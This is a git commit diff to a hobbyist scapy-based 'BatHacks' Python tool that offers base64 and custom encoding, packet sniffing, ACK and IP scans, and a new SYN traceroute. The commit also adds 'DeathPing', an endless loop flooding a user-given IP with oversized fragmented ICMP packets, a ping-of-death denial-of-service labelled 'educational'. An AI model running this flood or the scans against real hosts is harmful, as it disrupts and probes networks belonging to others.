7ff47cecb1c9e8c2c11d2002333928c8d02e4800
SeaBass4201759 <164813896+SeaBass4201759@users.noreply.github.com>
2024-10-09 21:52:15 -0400

    Update BatHacks.py

--- BatHacks.py
+++ BatHacks.py
@@ -1,7 +1,7 @@
 import base64
 from scapy.all import *
 def intro():  
-  print("\033[38;5;124m" + r"""
+  print("\033[38;5;124m"+r"""
     ._.                 _.____.
      ) \              /    .(
      )  |            .'   .(
@@ -29,20 +29,40 @@ def base64_encryption():
   encypt_This_Message = input('\nEnter what you want to encrypt in Base64: ')
   encode64 = base64.b64encode(encypt_This_Message.encode("utf-8"))
   messge = print(f"\nEncrypted message: {encode64}")
+  
 #base64 decrytpin function 
 def base64_decryption():
   decrypt_This_Message = input('\nEnter what you want to decrypt in Base64: ')
   decode64 = base64.b64decode(decrypt_This_Message.encode("ascii"))
   print(f"\nDecrypted message: {decode64}")
+
 def packet_sniffer():
   num = int(input("\nEnter how many packets you want to sniff: "))
   packet = sniff(count=num)
   packet.show()
+
 def ACKscan():
   destination = input('\nEnter the domain name: ')
   ans, unans = sr(IP(dst=destination)/TCP(dport=[80,666],flags="A"))
   print(f"Ans: {ans.show()}")
-  print(f"Unans: {unans.show()}")
+  print(f"Unans: {unans.show}")
+
+def SYNtraceroute():
+  destination = input("Enter the destination: ")
+  ans, unans = sr(IP(dst=destination,ttl=(1,10))/TCP(dport=53,flags="S"))
+  ans.summary( lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
+
+def IPscan():
+  ipnum = input("\nEnter IP number to scan: ")
+  ans, unans = sr(IP(dst=ipnum,proto=(0,255))/"SCAPY",retry=2)
+  print(f"ans: {ans.show()}")
+  print(f"unans: {unans.show()}")  
+
+def DeathPing():
+  dest = input("Enter the target's IP: ")
+  while True:
+    send( fragment(IP(dst=dest)/ICMP()/("X"*600000)) )
+    
 def bat_encrypt():
   secret_bat_message = input("\nEnter what you want to encrypt: ")
   daList = []
@@ -52,18 +72,20 @@ def bat_encrypt():
     popval = int(popval)
     daList.append(bin(popval))
   print(":".join(daList)) #The binary val is 'str'
+
 ########### The brains of the operation ################
 intro()
 def daBrain():
   #bat hacks options
   selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
+  
   while selection == '1' or '2' or '3': 
     #Cryptography
     if selection == '1':
-      cryp_choice = input("\nWelcome to the cryptography section. What do you want to use?\n1. Base64\n2.Bat-ography\nEnter choice: ")
+      cryp_choice = input("\nWelcome to the cryptography section. What do you want to use?\n1.Base64\n2.Bat-ography\nEnter choice: ")
       #base64
       if cryp_choice == '1':
-        en_decryp = input("\nWhat would you like to do?\n1. Encryption \n2. Decryption\nEnter choice: ")
+        en_decryp = input("\nWhat would you like to do?\n1.Encryption \n2.Decryption\nEnter choice: ")
         if en_decryp == '1':
           base64_encryption()
           selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
@@ -76,19 +98,32 @@ def daBrain():
         selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
       else:
         selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
+
     #Network Stuff 
     elif selection == '2':
-      network_choice = input("\nWhat kind of network stuff do you want to do?\n1.Packet Sniffing\n2.ACK scan\nEnter choice: ")
+      network_choice = input("\nWhat kind of network stuff do you want to do?\n1.Packet Sniffing\n2.ACK Scanner\n3.TCP SYN traceroute\n4.IP scanner\n5.Ping of Death #educational purposes\nEnter choice: ")
       if network_choice == '1':
         packet_sniffer()
         selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
       elif network_choice == '2':
        ACKscan()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
+      elif network_choice == '3':
+        SYNtraceroute()
+        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
+      elif network_choice == '4':
+        IPscan()
+        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
+      elif network_choice == '5':
+        DeathPing()
+        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
       else:
         selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
+
     elif selection == '3':
       exit()
+    
     else:
-      selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')      
+      selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
+      
 daBrain()
